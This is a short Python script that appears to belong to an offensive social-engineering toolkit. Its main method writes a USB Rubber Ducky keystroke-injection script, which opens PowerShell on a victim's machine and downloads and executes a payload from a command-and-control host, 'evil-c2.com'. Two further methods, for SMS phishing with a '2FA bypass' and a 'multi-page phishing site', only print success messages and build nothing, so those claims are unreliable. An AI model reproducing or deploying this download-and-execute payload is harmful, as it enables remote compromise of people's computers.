#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Rich Advanced Social Engineering"""

from rich.console import Console
from rich.panel import Panel

console = Console()

class AdvancedSocial:
    def usb_rubber_ducky(self):
        """USB Rubber Ducky scripts"""
        console.print(Panel.fit(
            "[bold red]USB Rubber Ducky[/bold red]",
            border_style="red"
        ))
        
        script = '''
REM Rubber Ducky script
DELAY 1000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000
STRING IEX(New-Object Net.WebClient).DownloadString('http://evil-c2.com/payload.ps1')
ENTER
'''
        
        with open("ducky_script.txt", 'w') as f:
            f.write(script)
        
        console.print("[green]✓ Ducky script created[/green]")
    
    def sms_phishing(self):
        """SMS phishing with 2FA bypass"""
        console.print("[bold cyan]SMS Phishing[/bold cyan]")
        console.print("[cyan]Bypass 2FA via SMS interception[/cyan]")
    
    def create_multi_page_phish(self):
        """Multi-page phishing site"""
        console.print("[bold yellow]Multi-Page Phishing[/bold yellow]")
        console.print("[green]✓ Multi-page phishing site created[/green]")

if __name__ == "__main__":
    social = AdvancedSocial()
    social.usb_rubber_ducky()

